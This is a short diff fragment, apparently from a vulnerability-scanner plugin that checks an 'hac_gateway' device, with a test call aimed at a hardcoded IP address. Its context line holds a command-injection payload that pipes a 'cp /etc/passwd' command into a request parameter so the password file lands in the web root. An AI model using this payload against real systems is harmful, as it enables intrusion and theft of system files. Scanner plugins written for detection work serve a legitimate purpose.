@@ -33,5 +33,5 @@ op_type=downloadcatch&eth0=1 | cp /etc/passwd /usr/local/apache2/htdocs/project/
         security_hole(target)
     
 if __name__ == '__main__': 
-    from dummy import *
+
     audit(assign('hac_gateway','https://123.124.158.72/')[1])
